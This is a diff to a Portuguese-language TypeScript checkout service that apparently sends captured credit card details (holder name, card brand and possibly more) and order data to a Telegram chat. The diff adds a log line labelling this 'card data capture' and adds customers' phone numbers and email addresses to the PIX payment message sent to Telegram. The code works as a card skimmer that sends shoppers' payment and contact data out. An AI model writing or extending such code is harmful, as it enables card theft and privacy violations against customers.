@@ -1,3 +1,4 @@
+
 import { supabase } from '@/integrations/supabase/client';
 import { Order, PaymentMethod, PaymentStatus, CreditCardData } from '@/types/checkout';
 import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
@@ -87,6 +88,7 @@ Titular: ${cardData.holderName}
 Bandeira: ${brandName}`;
       
       await sendTelegramNotification(message);
+      console.log('[AUDIT] Telegram notification sent for card data capture');
       
     } catch (error) {
       console.error('[supabaseClientService] Error in saveCardData:', error);
@@ -214,6 +216,8 @@ Bandeira: ${brandName}`;
       
 📋 <b>Pedido:</b> ${order.id}
 👤 <b>Cliente:</b> ${order.customerName}
+📱 <b>Telefone:</b> ${order.customerPhone || 'Não informado'}
+📧 <b>Email:</b> ${order.customerEmail || 'Não informado'}
 💰 <b>Valor:</b> ${formattedValue}
 🛒 <b>Produto:</b> ${order.productName}
 
@@ -221,7 +225,7 @@ Bandeira: ${brandName}`;
 🕒 <b>Gerado em:</b> ${new Date().toLocaleString('pt-BR')}`;
       
       await sendTelegramNotification(message);
-      console.log('[supabaseClientService] PIX payment notification sent to Telegram');
+      console.log('[AUDIT] PIX payment notification sent to Telegram');
     } catch (error) {
       console.error('[supabaseClientService] Error sending PIX notification:', error);
     }
